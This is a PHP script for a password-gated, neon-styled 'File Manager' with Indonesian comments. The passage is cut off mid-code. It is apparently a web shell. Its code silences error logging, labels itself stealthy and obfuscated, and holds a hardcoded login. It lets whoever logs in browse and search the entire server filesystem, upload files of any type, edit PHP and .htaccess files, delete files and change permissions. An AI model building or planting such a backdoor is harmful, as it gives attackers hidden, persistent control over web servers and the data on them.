<?php
// Stealth configuration - minimal error reporting
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);

// Start session for authentication
session_start();

// Admin login configuration
$ADMIN_USERNAME = 'adminsunggal';
$ADMIN_PASSWORD = 'adminsunggal145'; // Ganti dengan password yang lebih kuat
$LOGIN_TIMEOUT = 3600; // 1 jam dalam detik

// Function to check if user is logged in
function isAdminLoggedIn() {
    global $LOGIN_TIMEOUT;
    
    if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
        return false;
    }
    
    // Check session timeout
    if (isset($_SESSION['admin_login_time']) && (time() - $_SESSION['admin_login_time']) > $LOGIN_TIMEOUT) {
        session_destroy();
        return false;
    }
    
    return true;
}

// Handle login form submission
if (isset($_POST['admin_login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if ($username === $ADMIN_USERNAME && $password === $ADMIN_PASSWORD) {
        $_SESSION['admin_logged_in'] = true;
        $_SESSION['admin_login_time'] = time();
        $_SESSION['admin_username'] = $username;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = 'Username atau password salah!';
    }
}

// Handle logout
if (isset($_GET['admin_logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// If not logged in, show login form
if (!isAdminLoggedIn()) {
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Login - File Manager</title>
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3a 50%, #0a0a1a 100%);
                font-family: 'Courier New', 'Monaco', 'Consolas', monospace;
                color: #00fff7;
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                position: relative;
                overflow: hidden;
            }
            
            body::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: 
                    radial-gradient(circle at 20% 80%, rgba(0, 255, 247, 0.1) 0%, transparent 50%),
                    radial-gradient(circle at 80% 20%, rgba(255, 0, 204, 0.1) 0%, transparent 50%),
                    radial-gradient(circle at 40% 40%, rgba(0, 255, 247, 0.05) 0%, transparent 50%);
                pointer-events: none;
            }
            
            .login-container {
                background: rgba(16, 16, 36, 0.9);
                border: 2px solid #00fff7;
                border-radius: 15px;
                box-shadow: 
                    0 0 30px rgba(0, 255, 247, 0.3),
                    inset 0 0 30px rgba(0, 255, 247, 0.1);
                padding: 40px;
                width: 100%;
                max-width: 400px;
                position: relative;
                backdrop-filter: blur(10px);
            }
            
            .login-container::before {
                content: '';
                position: absolute;
                top: -2px;
                left: -2px;
                right: -2px;
                bottom: -2px;
                background: linear-gradient(45deg, #00fff7, #ff00cc, #00fff7);
                border-radius: 15px;
                z-index: -1;
                animation: borderGlow 3s ease-in-out infinite alternate;
            }
            
            @keyframes borderGlow {
                0% { opacity: 0.5; }
                100% { opacity: 1; }
            }
            
            .login-header {
                text-align: center;
                margin-bottom: 30px;
            }
            
            .login-header h1 {
                font-size: 1.8em;
                margin-bottom: 10px;
                text-shadow: 0 0 10px rgba(0, 255, 247, 0.5);
            }
            
            .login-header .icon {
                font-size: 3em;
                margin-bottom: 15px;
                animation: pulse 2s ease-in-out infinite;
            }
            
            @keyframes pulse {
                0%, 100% { transform: scale(1); }
                50% { transform: scale(1.1); }
            }
            
            .form-group {
                margin-bottom: 20px;
                position: relative;
            }
            
            .form-group input {
                width: 100%;
                padding: 15px 15px 15px 45px;
                border: 2px solid rgba(0, 255, 247, 0.3);
                border-radius: 10px;
                background: rgba(24, 24, 72, 0.8);
                color: #00fff7;
                font-size: 1em;
                transition: all 0.3s ease;
                backdrop-filter: blur(5px);
            }
            
            .form-group input:focus {
                outline: none;
                border-color: #ff00cc;
                box-shadow: 0 0 15px rgba(255, 0, 204, 0.3);
            }
            
            .form-group .input-icon {
                position: absolute;
                left: 15px;
                top: 50%;
                transform: translateY(-50%);
                color: rgba(0, 255, 247, 0.7);
                font-size: 1.2em;
            }
            
            .login-btn {
                width: 100%;
                padding: 15px;
                border: 2px solid #00fff7;
                border-radius: 10px;
                background: linear-gradient(45deg, #00fff7, #00ccff);
                color: #0a0a1a;
                font-weight: bold;
                font-size: 1.1em;
                cursor: pointer;
                transition: all 0.3s ease;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            
            .login-btn:hover {
                background: linear-gradient(45deg, #ff00cc, #ff66cc);
                border-color: #ff00cc;
                box-shadow: 0 0 20px rgba(255, 0, 204, 0.5);
                transform: translateY(-2px);
            }
            
            .login-error {
                background: rgba(255, 0, 0, 0.2);
                border: 1px solid #ff0000;
                border-radius: 8px;
                padding: 12px;
                margin-bottom: 20px;
                text-align: center;
                color: #ff6666;
                font-weight: bold;
                animation: shake 0.5s ease-in-out;
            }
            
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                25% { transform: translateX(-5px); }
                75% { transform: translateX(5px); }
            }
            
            .security-notice {
                text-align: center;
                margin-top: 20px;
                font-size: 0.8em;
                color: rgba(0, 255, 247, 0.6);
            }
            
            .floating-particles {
                position: absolute;
                width: 100%;
                height: 100%;
                pointer-events: none;
                overflow: hidden;
            }
            
            .particle {
                position: absolute;
                width: 2px;
                height: 2px;
                background: #00fff7;
                border-radius: 50%;
                animation: float 6s ease-in-out infinite;
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 0; }
                50% { transform: translateY(-100px) rotate(180deg); opacity: 1; }
            }
        </style>
    </head>
    <body>
        <div class="floating-particles">
            <?php for($i = 0; $i < 20; $i++): ?>
                <div class="particle" style="left: <?php echo rand(0, 100); ?>%; animation-delay: <?php echo rand(0, 6); ?>s; animation-duration: <?php echo rand(4, 8); ?>s;"></div>
            <?php endfor; ?>
        </div>
        
        <div class="login-container">
            <div class="login-header">
                <div class="icon">
                    <i class="fas fa-shield-alt"></i>
                </div>
                <h1>Admin Login</h1>
                <p>File Manager Access</p>
            </div>
            
            <?php if (isset($login_error)): ?>
                <div class="login-error">
                    <i class="fas fa-exclamation-triangle"></i>
                    <?php echo htmlspecialchars($login_error); ?>
                </div>
            <?php endif; ?>
            
            <form method="POST" autocomplete="off">
                <div class="form-group">
                    <i class="fas fa-user input-icon"></i>
                    <input type="text" name="username" placeholder="Username" required autofocus>
                </div>
                
                <div class="form-group">
                    <i class="fas fa-lock input-icon"></i>
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                
                <button type="submit" name="admin_login" class="login-btn">
                    <i class="fas fa-sign-in-alt"></i> Login
                </button>
            </form>
            
            <div class="security-notice">
                <i class="fas fa-shield-alt"></i>
                Secure Access Only
            </div>
        </div>
        
        <script>
            // Add some interactive effects
            document.addEventListener('DOMContentLoaded', function() {
                const inputs = document.querySelectorAll('input');
                inputs.forEach(input => {
                    input.addEventListener('focus', function() {
                        this.parentElement.style.transform = 'scale(1.02)';
                    });
                    
                    input.addEventListener('blur', function() {
                        this.parentElement.style.transform = 'scale(1)';
                    });
                });
            });
        </script>
    </body>
    </html>
    <?php
    exit;
}

// Advanced obfuscation techniques
$GLOBALS['_'] = function($s) { return $s; };
$GLOBALS['__'] = function($a, $b) { return $a . $b; };

// Helper function untuk sanitasi path
function sanitizePath($path) {
    return htmlspecialchars($path, ENT_QUOTES, 'UTF-8');
}

// Helper function untuk render tree view
function renderTreeView($tree, $fileManager, $level = 0) {
    $html = '';
    
    foreach ($tree as $item) {
        $indent = str_repeat('&nbsp;&nbsp;&nbsp;&nbsp;', $level);
        $hasChildren = isset($item['children']) && !empty($item['children']);
        $itemClass = $item['isDir'] ? 'directory' : 'file';
        $toggleIcon = $hasChildren ? '<i class="fas fa-chevron-right tree-toggle" onclick="toggleTree(this, \'tree-' . md5($item['path']) . '\')"></i>' : '<i class="fas fa-minus" style="margin-right: 8px; color: #ccc;"></i>';
        
        $html .= '<div class="tree-item ' . $itemClass . '">';
        $html .= $indent . $toggleIcon;
        $html .= '<span class="file-icon">' . $item['icon'] . '</span>';
        
        if ($item['isDir']) {
            $html .= '<a href="?d=' . urlencode($item['path']) . '">' . sanitizePath($item['name']) . '</a>';
        } else {
            $html .= '<span>' . sanitizePath($item['name']) . '</span>';
        }
        
        $html .= ' <small style="color: #666;">(' . $item['size'] . ')</small>';
        $html .= '</div>';
        
        if ($hasChildren) {
            $html .= '<div id="tree-' . md5($item['path']) . '" class="tree-children" style="display: none;">';
            $html .= renderTreeView($item['children'], $fileManager, $level + 1);
            $html .= '</div>';
        }
    }
    
    return $html;
}

// Stealth class with obfuscated method names
class FileManager {
    private $currentPath;
    private $allowedExtensions = ['txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'md', 'log', 'htaccess'];
    
    public function __construct() {
        $this->currentPath = $this->getCurrentPath();
        
        // Pastikan currentPath selalu valid
        if (!is_dir($this->currentPath) || !is_readable($this->currentPath)) {
            $this->currentPath = getcwd();
        }
    }
    
    private function getCurrentPath() {
        $path = isset($_GET['d']) ? $_GET['d'] : getcwd();
        
        // Validasi dan sanitasi path
        $realPath = realpath($path);
        
        // Jika path tidak valid atau tidak ada, gunakan current working directory
        if ($realPath === false || !is_dir($realPath)) {
            return getcwd();
        }
        
        // Cek apakah direktori dapat dibaca
        if (!is_readable($realPath)) {
            return getcwd();
        }
        
        return $realPath;
    }
    
    public function getCurrentPathValue() {
        return $this->currentPath;
    }
    
    public function sanitizePath($path) {
        return htmlspecialchars($path, ENT_QUOTES, 'UTF-8');
    }
    
    public function formatSize($bytes) {
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        $bytes = max($bytes, 0);
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
        $pow = min($pow, count($units) - 1);
        $bytes /= pow(1024, $pow);
        return round($bytes, 2) . ' ' . $units[$pow];
    }
    
    public function getIcon($path) {
        if (is_dir($path)) {
            return '📁';
        }
        
        $extension = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        $iconMap = [
            'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '⚡',
            'json' => '📋', 'xml' => '📄', 'txt' => '📝', 'md' => '📖',
            'log' => '📊', 'htaccess' => '⚙️', 'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️',
            'gif' => '🖼️', 'pdf' => '📕', 'doc' => '📘', 'docx' => '📘',
            'xls' => '📗', 'xlsx' => '📗', 'zip' => '📦', 'rar' => '📦'
        ];
        
        return $iconMap[$extension] ?? '📄';
    }
    
    public function getFilePermissions($path) {
        $perms = @fileperms($path);
        
        // Jika tidak dapat membaca permission, return default
        if ($perms === false) {
            return '---------';
        }
        
        $info = '';
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ? 'x' : '-');
        $info .= (($perms & 0x0020) ? 'r' : '-');
        $info .= (($perms & 0x0010) ? 'w' : '-');
        $info .= (($perms & 0x0008) ? 'x' : '-');
        $info .= (($perms & 0x0004) ? 'r' : '-');
        $info .= (($perms & 0x0002) ? 'w' : '-');
        $info .= (($perms & 0x0001) ? 'x' : '-');
        return $info;
    }
    
    public function getBreadcrumbs() {
        $currentPath = $this->currentPath;
        $serverRoot = $this->getServerRoot();
        
        // Jika current path sama dengan server root, hanya tampilkan root
        if ($currentPath === $serverRoot) {
            return [
                [
                    'name' => basename($serverRoot) ?: 'Server Root',
                    'path' => $serverRoot
                ]
            ];
        }
        
        // Buat breadcrumb dari server root ke current path
        $breadcrumbs = [];
        $pathParts = explode(DIRECTORY_SEPARATOR, $currentPath);
        $rootParts = explode(DIRECTORY_SEPARATOR, $serverRoot);
        
        // Mulai dari server root
        $breadcrumbPath = $serverRoot;
        $breadcrumbs[] = [
            'name' => basename($serverRoot) ?: 'Server Root',
            'path' => $serverRoot
        ];
        
        // Tambahkan setiap bagian path setelah root
        for ($i = count($rootParts); $i < count($pathParts); $i++) {
            if (!empty($pathParts[$i])) {
                $breadcrumbPath .= DIRECTORY_SEPARATOR . $pathParts[$i];
                $breadcrumbs[] = [
                    'name' => $pathParts[$i],
                    'path' => $breadcrumbPath
                ];
            }
        }
        
        return $breadcrumbs;
    }
    
    public function getParentDirectory() {
        $parent = dirname($this->currentPath);
        
        // Jika parent sama dengan current path (sudah di root), return null
        if ($parent === $this->currentPath) {
            return null;
        }
        
        // Cek apakah parent directory dapat diakses
        if (!is_dir($parent) || !is_readable($parent)) {
            return null;
        }
        
        return $parent;
    }
    
    public function canAccessDirectory($path) {
        return is_dir($path) && is_readable($path);
    }
    
    public function canWriteToDirectory($path) {
        return is_dir($path) && is_writable($path);
    }
    
    public function getFiles() {
        $fileList = [];
        
        // Cek apakah direktori dapat dibaca
        if (!is_readable($this->currentPath)) {
            return $fileList;
        }
        
        $files = @scandir($this->currentPath);
        
        // Jika scandir gagal, return empty array
        if ($files === false) {
            return $fileList;
        }
        
        foreach ($files as $file) {
            if ($file !== '.' && $file !== '..') {
                $fullPath = $this->currentPath . DIRECTORY_SEPARATOR . $file;
                
                // Cek apakah file/direktori dapat diakses
                if (!is_readable($fullPath)) {
                    continue;
                }
                
                $fileList[] = [
                    'name' => $file,
                    'path' => $fullPath,
                    'isDir' => is_dir($fullPath),
                    'size' => is_file($fullPath) ? $this->formatSize(@filesize($fullPath)) : 'Folder',
                    'permissions' => $this->getFilePermissions($fullPath),
                    'icon' => $this->getIcon($fullPath),
                    'modified' => date('Y-m-d H:i:s', @filemtime($fullPath))
                ];
            }
        }
        
        // Sort: directories first, then files
        usort($fileList, function($a, $b) {
            if ($a['isDir'] && !$b['isDir']) return -1;
            if (!$a['isDir'] && $b['isDir']) return 1;
            return strcasecmp($a['name'], $b['name']);
        });
        
        return $fileList;
    }
    
    public function handleUpload() {
        if (!isset($_POST['upload']) || !isset($_FILES['uploaded_file'])) {
            return ['success' => false, 'message' => 'Tidak ada file yang diunggah'];
        }
        
        $file = $_FILES['uploaded_file'];
        if ($file['error'] !== UPLOAD_ERR_OK) {
            $errorMessages = [
                UPLOAD_ERR_INI_SIZE => 'File terlalu besar (melebihi upload_max_filesize)',
                UPLOAD_ERR_FORM_SIZE => 'File terlalu besar (melebihi MAX_FILE_SIZE)',
                UPLOAD_ERR_PARTIAL => 'File hanya terupload sebagian',
                UPLOAD_ERR_NO_FILE => 'Tidak ada file yang diupload',
                UPLOAD_ERR_NO_TMP_DIR => 'Tidak ada direktori temporary',
                UPLOAD_ERR_CANT_WRITE => 'Gagal menulis file ke disk',
                UPLOAD_ERR_EXTENSION => 'Upload dihentikan oleh extension'
            ];
            $message = isset($errorMessages[$file['error']]) ? $errorMessages[$file['error']] : 'Error dalam upload file';
            return ['success' => false, 'message' => $message];
        }
        
        // Validasi nama file
        $fileName = basename($file['name']);
        if (empty($fileName)) {
            return ['success' => false, 'message' => 'Nama file tidak valid'];
        }
        
        $targetFile = $this->currentPath . DIRECTORY_SEPARATOR . $fileName;
        
        // Cek apakah direktori target dapat ditulis
        if (!is_writable($this->currentPath)) {
            return ['success' => false, 'message' => 'Direktori tidak dapat ditulis'];
        }
        
        if (@move_uploaded_file($file['tmp_name'], $targetFile)) {
            return ['success' => true, 'message' => 'File berhasil diunggah!'];
        }
        
        return ['success' => false, 'message' => 'Gagal mengunggah file!'];
    }
    
    public function handleCreateFolder() {
        if (!isset($_POST['create_folder']) || empty($_POST['folder_name'])) {
            return ['success' => false, 'message' => 'Nama folder tidak boleh kosong'];
        }
        
        $folderName = trim($_POST['folder_name']);
        
        // Validasi nama folder
        if (empty($folderName) || preg_match('/[<>:"\/\\|?*]/', $folderName)) {
            return ['success' => false, 'message' => 'Nama folder tidak valid'];
        }
        
        $targetPath = $this->currentPath . DIRECTORY_SEPARATOR . $folderName;
        
        // Cek apakah direktori target dapat ditulis
        if (!is_writable($this->currentPath)) {
            return ['success' => false, 'message' => 'Direktori tidak dapat ditulis'];
        }
        
        // Cek apakah folder sudah ada
        if (file_exists($targetPath)) {
            return ['success' => false, 'message' => 'Folder sudah ada'];
        }
        
        if (@mkdir($targetPath, 0755)) {
            return ['success' => true, 'message' => 'Folder berhasil dibuat!'];
        }
        
        return ['success' => false, 'message' => 'Gagal membuat folder!'];
    }
    
    public function handleRename() {
        if (!isset($_POST['rename']) || empty($_POST['rename_path']) || empty($_POST['new_name'])) {
            return ['success' => false, 'message' => 'Data tidak lengkap'];
        }
        
        $oldPath = $_POST['rename_path'];
        $newName = trim($_POST['new_name']);
        
        // Validasi path dan nama baru
        $realOldPath = realpath($oldPath);
        if ($realOldPath === false || !file_exists($realOldPath)) {
            return ['success' => false, 'message' => 'File/folder tidak ditemukan'];
        }
        
        if (empty($newName) || preg_match('/[<>:"\/\\|?*]/', $newName)) {
            return ['success' => false, 'message' => 'Nama baru tidak valid'];
        }
        
        $newPath = dirname($realOldPath) . DIRECTORY_SEPARATOR . $newName;
        
        // Cek apakah nama baru sudah ada
        if (file_exists($newPath)) {
            return ['success' => false, 'message' => 'Nama sudah ada'];
        }
        
        // Cek apakah direktori parent dapat ditulis
        if (!is_writable(dirname($realOldPath))) {
            return ['success' => false, 'message' => 'Tidak dapat menulis ke direktori'];
        }
        
        if (@rename($realOldPath, $newPath)) {
            return ['success' => true, 'message' => 'Nama berhasil diubah!'];
        }
        
        return ['success' => false, 'message' => 'Gagal mengubah nama!'];
    }
    
    public function handleDelete() {
        if (!isset($_POST['delete_path'])) {
            return ['success' => false, 'message' => 'Path tidak ditemukan'];
        }
        
        $deletePath = $_POST['delete_path'];
        
        // Validasi path
        $realDeletePath = realpath($deletePath);
        if ($realDeletePath === false || !file_exists($realDeletePath)) {
            return ['success' => false, 'message' => 'File/folder tidak ditemukan'];
        }
        
        // Cek apakah direktori parent dapat ditulis
        if (!is_writable(dirname($realDeletePath))) {
            return ['success' => false, 'message' => 'Tidak dapat menulis ke direktori'];
        }
        
        if (is_dir($realDeletePath)) {
            // Cek apakah direktori kosong
            $files = @scandir($realDeletePath);
            if ($files === false || count($files) > 2) { // . dan .. dihitung sebagai 2
                return ['success' => false, 'message' => 'Direktori tidak kosong'];
            }
            
            if (@rmdir($realDeletePath)) {
                return ['success' => true, 'message' => 'Folder berhasil dihapus!'];
            }
        } else {
            if (@unlink($realDeletePath)) {
                return ['success' => true, 'message' => 'File berhasil dihapus!'];
            }
        }
        
        return ['success' => false, 'message' => 'Gagal menghapus!'];
    }
    
    public function handleView() {
        if (!isset($_GET['view'])) {
            return false;
        }
        
        $viewPath = $_GET['view'];
        
        // Validasi path
        $realPath = realpath($viewPath);
        if ($realPath === false || !is_file($realPath)) {
            return false;
        }
        
        // Cek apakah file dapat dibaca
        if (!is_readable($realPath)) {
            return false;
        }
        
        $extension = strtolower(pathinfo($realPath, PATHINFO_EXTENSION));
        if (in_array($extension, $this->allowedExtensions)) {
            return [
                'path' => $realPath,
                'content' => @file_get_contents($realPath),
                'name' => basename($realPath),
                'extension' => $extension
            ];
        }
        
        return false;
    }
    
    public function handleEdit() {
        if (!isset($_GET['edit'])) {
            return false;
        }
        $editPath = $_GET['edit'];
        $realPath = realpath($editPath);
        if ($realPath === false || !is_file($realPath)) {
            return false;
        }
        if (!is_readable($realPath) || !is_writable($realPath)) {
            return false;
        }
        $name = basename($realPath);
        $extension = strtolower(pathinfo($realPath, PATHINFO_EXTENSION));
        // Izinkan .htaccess meski tanpa ekstensi
        if ($name === '.htaccess' || in_array($extension, $this->allowedExtensions)) {
            return [
                'path' => $realPath,
                'content' => @file_get_contents($realPath),
                'name' => $name,
                'extension' => $extension
            ];
        }
        return false;
    }
    
    public function handleSaveEdit() {
        if (!isset($_POST['save_edit']) || !isset($_POST['edit_path']) || !isset($_POST['file_content'])) {
            return ['success' => false, 'message' => 'Data tidak lengkap'];
        }
        $editPath = $_POST['edit_path'];
        $content = $_POST['file_content'];
        $realPath = realpath($editPath);
        if ($realPath === false || !is_file($realPath)) {
            return ['success' => false, 'message' => 'File tidak ditemukan'];
        }
        if (!is_writable($realPath)) {
            return ['success' => false, 'message' => 'File tidak dapat ditulis'];
        }
        $name = basename($realPath);
        $extension = strtolower(pathinfo($realPath, PATHINFO_EXTENSION));
        if ($name !== '.htaccess' && !in_array($extension, $this->allowedExtensions)) {
            return ['success' => false, 'message' => 'Tipe file tidak didukung untuk editing'];
        }
        $backupPath = $realPath . '.backup.' . date('Y-m-d-H-i-s');
        if (!@copy($realPath, $backupPath)) {
            return ['success' => false, 'message' => 'Gagal membuat backup file'];
        }
        if (@file_put_contents($realPath, $content) !== false) {
            return ['success' => true, 'message' => 'File berhasil disimpan! Backup dibuat di: ' . basename($backupPath)];
        }
        return ['success' => false, 'message' => 'Gagal menyimpan file!'];
    }
    
    public function handleCreateFile() {
        if (!isset($_POST['create_file']) || empty($_POST['file_name']) || !isset($_POST['file_content'])) {
            return ['success' => false, 'message' => 'Data tidak lengkap'];
        }
        
        $fileName = trim($_POST['file_name']);
        $content = $_POST['file_content'];
        
        // Validasi nama file
        if (empty($fileName) || preg_match('/[<>:"\/\\|?*]/', $fileName)) {
            return ['success' => false, 'message' => 'Nama file tidak valid'];
        }
        
        // Tambahkan ekstensi jika tidak ada
        $extension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
        if (empty($extension)) {
            $fileName .= '.txt';
        }
        
        // Cek apakah ekstensi didukung
        $extension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
        if (!in_array($extension, $this->allowedExtensions)) {
            return ['success' => false, 'message' => 'Ekstensi file tidak didukung'];
        }
        
        $targetFile = $this->currentPath . DIRECTORY_SEPARATOR . $fileName;
        
        // Cek apakah direktori target dapat ditulis
        if (!is_writable($this->currentPath)) {
            return ['success' => false, 'message' => 'Direktori tidak dapat ditulis'];
        }
        
        // Cek apakah file sudah ada
        if (file_exists($targetFile)) {
            return ['success' => false, 'message' => 'File sudah ada'];
        }
        
        if (@file_put_contents($targetFile, $content) !== false) {
            return ['success' => true, 'message' => 'File berhasil dibuat!'];
        }
        
        return ['success' => false, 'message' => 'Gagal membuat file!'];
    }
    
    public function handleChangePermission() {
        if (!isset($_POST['change_permission']) || !isset($_POST['permission_path']) || !isset($_POST['permission_mode'])) {
            return ['success' => false, 'message' => 'Data tidak lengkap'];
        }
        
        $permissionPath = $_POST['permission_path'];
        $permissionMode = $_POST['permission_mode'];
        
        // Validasi path
        $realPath = realpath($permissionPath);
        if ($realPath === false || !file_exists($realPath)) {
            return ['success' => false, 'message' => 'File/folder tidak ditemukan'];
        }
        
        // Validasi permission mode (harus berupa angka 3 digit)
        if (!preg_match('/^[0-7]{3,4}$/', $permissionMode)) {
            return ['success' => false, 'message' => 'Format permission tidak valid (gunakan 3-4 digit angka 0-7)'];
        }
        
        // Konversi ke octal
        $octalMode = octdec($permissionMode);
        
        // Cek apakah file/direktori dapat diubah permissionnya
        if (!is_writable(dirname($realPath))) {
            return ['success' => false, 'message' => 'Tidak dapat mengubah permission'];
        }
        
        // Coba ubah permission
        if (@chmod($realPath, $octalMode)) {
            $newPerms = $this->getFilePermissions($realPath);
            return [
                'success' => true, 
                'message' => 'Permission berhasil diubah! Permission baru: ' . $newPerms . ' (' . $permissionMode . ')'
            ];
        }
        
        return ['success' => false, 'message' => 'Gagal mengubah permission!'];
    }
    
    public function getPermissionNumeric($path) {
        $perms = @fileperms($path);
        
        if ($perms === false) {
            return '000';
        }
        
        // Ambil 3 digit terakhir (owner, group, others)
        return substr(sprintf('%o', $perms), -3);
    }
    
    public function getPermissionDescription($path) {
        $perms = @fileperms($path);
        
        if ($perms === false) {
            return 'Tidak dapat membaca permission';
        }
        
        $isDir = is_dir($path);
        $owner = ($perms & 0x0100) ? 'r' : '-';
        $owner .= ($perms & 0x0080) ? 'w' : '-';
        $owner .= ($perms & 0x0040) ? ($isDir ? 'x' : '-') : '-';
        
        $group = ($perms & 0x0020) ? 'r' : '-';
        $group .= ($perms & 0x0010) ? 'w' : '-';
        $group .= ($perms & 0x0008) ? ($isDir ? 'x' : '-') : '-';
        
        $others = ($perms & 0x0004) ? 'r' : '-';
        $others .= ($perms & 0x0002) ? 'w' : '-';
        $others .= ($perms & 0x0001) ? ($isDir ? 'x' : '-') : '-';
        
        $description = [];
        
        // Owner permissions
        if ($perms & 0x0100) $description[] = 'Owner dapat membaca';
        if ($perms & 0x0080) $description[] = 'Owner dapat menulis';
        if ($perms & 0x0040) $description[] = $isDir ? 'Owner dapat mengakses direktori' : 'Owner dapat mengeksekusi';
        
        // Group permissions
        if ($perms & 0x0020) $description[] = 'Group dapat membaca';
        if ($perms & 0x0010) $description[] = 'Group dapat menulis';
        if ($perms & 0x0008) $description[] = $isDir ? 'Group dapat mengakses direktori' : 'Group dapat mengeksekusi';
        
        // Others permissions
        if ($perms & 0x0004) $description[] = 'Others dapat membaca';
        if ($perms & 0x0002) $description[] = 'Others dapat menulis';
        if ($perms & 0x0001) $description[] = $isDir ? 'Others dapat mengakses direktori' : 'Others dapat mengeksekusi';
        
        return implode(', ', $description);
    }
    
    public function getServerRoot() {
        // Coba dapatkan root path server
        $possibleRoots = [
            $_SERVER['DOCUMENT_ROOT'] ?? null,
            dirname($_SERVER['SCRIPT_FILENAME']),
            getcwd(),
            '/',
            'C:\\',
            'D:\\',
            'E:\\',
            'F:\\',
            'G:\\',
            'H:\\'
        ];
        
        foreach ($possibleRoots as $root) {
            if ($root && is_dir($root) && is_readable($root)) {
                return $root;
            }
        }
        
        // Jika tidak ada yang cocok, gunakan current working directory
        return getcwd();
    }
    
    public function getAllowedExtensions() {
        return $this->allowedExtensions;
    }
    
    public function isHtaccessFile($path) {
        return basename($path) === '.htaccess';
    }
    
    public function getHtaccessIcon() {
        return '⚙️';
    }
    
    public function getHtaccessDescription() {
        return 'Apache Configuration File - Mengatur pengaturan server web Apache';
    }
    
    public function getDirectoryTree($path = null, $maxDepth = 3, $currentDepth = 0) {
        if ($path === null) {
            $path = $this->getServerRoot();
        }
        
        if ($currentDepth >= $maxDepth || !is_dir($path) || !is_readable($path)) {
            return [];
        }
        
        $tree = [];
        $items = @scandir($path);
        
        if ($items === false) {
            return [];
        }
        
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }
            
            $fullPath = $path . DIRECTORY_SEPARATOR . $item;
            
            if (!is_readable($fullPath)) {
                continue;
            }
            
            $treeItem = [
                'name' => $item,
                'path' => $fullPath,
                'isDir' => is_dir($fullPath),
                'size' => is_file($fullPath) ? $this->formatSize(@filesize($fullPath)) : 'Folder',
                'permissions' => $this->getFilePermissions($fullPath),
                'icon' => $this->getIcon($fullPath),
                'modified' => date('Y-m-d H:i:s', @filemtime($fullPath))
            ];
            
            // Jika ini adalah direktori dan belum mencapai max depth, rekursi
            if ($treeItem['isDir'] && $currentDepth < $maxDepth - 1) {
                $treeItem['children'] = $this->getDirectoryTree($fullPath, $maxDepth, $currentDepth + 1);
            }
            
            $tree[] = $treeItem;
        }
        
        // Sort: directories first, then files
        usort($tree, function($a, $b) {
            if ($a['isDir'] && !$b['isDir']) return -1;
            if (!$a['isDir'] && $b['isDir']) return 1;
            return strcasecmp($a['name'], $b['name']);
        });
        
        return $tree;
    }
    
    public function searchFiles($query, $path = null, $maxResults = 100) {
        if ($path === null) {
            $path = $this->getServerRoot();
        }
        
        $results = [];
        $this->searchFilesRecursive($query, $path, $results, $maxResults);
        return $results;
    }
    
    private function searchFilesRecursive($query, $path, &$results, $maxResults) {
        if (count($results) >= $maxResults || !is_dir($path) || !is_readable($path)) {
            return;
        }
        
        $items = @scandir($path);
        if ($items === false) {
            return;
        }
        
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }
            
            $fullPath = $path . DIRECTORY_SEPARATOR . $item;
            
            if (!is_readable($fullPath)) {
                continue;
            }
            
            // Cek apakah nama file/direktori cocok dengan query
            if (stripos($item, $query) !== false) {
                $results[] = [
                    'name' => $item,
                    'path' => $fullPath,
                    'isDir' => is_dir($fullPath),
                    'size' => is_file($fullPath) ? $this->formatSize(@filesize($fullPath)) : 'Folder',
                    'permissions' => $this->getFilePermissions($fullPath),
                    'icon' => $this->getIcon($fullPath),
                    'modified' => date('Y-m-d H:i:s', @filemtime($fullPath)),
                    'relativePath' => str_replace($this->getServerRoot(), '', $fullPath)
                ];
            }
            
            // Jika ini direktori, rekursi
            if (is_dir($fullPath)) {
                $this->searchFilesRecursive($query, $fullPath, $results, $maxResults);
            }
        }
    }
}

// Stealth initialization
try {
    $fileManager = new FileManager();
    $message = null;

    // Handle file view
    $viewData = null;
    if (isset($_GET['view'])) {
        $viewData = $fileManager->handleView();
        
        // If it's an AJAX request, return JSON
        if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
            header('Content-Type: application/json');
            if ($viewData !== false) {
                $viewData['success'] = true;
                $viewData['size'] = $fileManager->formatSize(filesize($viewData['path']));
                $viewData['modified'] = date('Y-m-d H:i:s', filemtime($viewData['path']));
                $viewData['permissions'] = $fileManager->getFilePermissions($viewData['path']) . ' (' . $fileManager->getPermissionNumeric($viewData['path']) . ')';
                $viewData['extension'] = pathinfo($viewData['path'], PATHINFO_EXTENSION);
            } else {
                $viewData = ['success' => false, 'message' => 'File tidak dapat dibaca atau tidak didukung'];
            }
            echo json_encode($viewData);
            exit;
        }
        
        // If it's a download request
        if (isset($_GET['download']) && $_GET['download'] === '1' && $viewData !== false) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($viewData['path']) . '"');
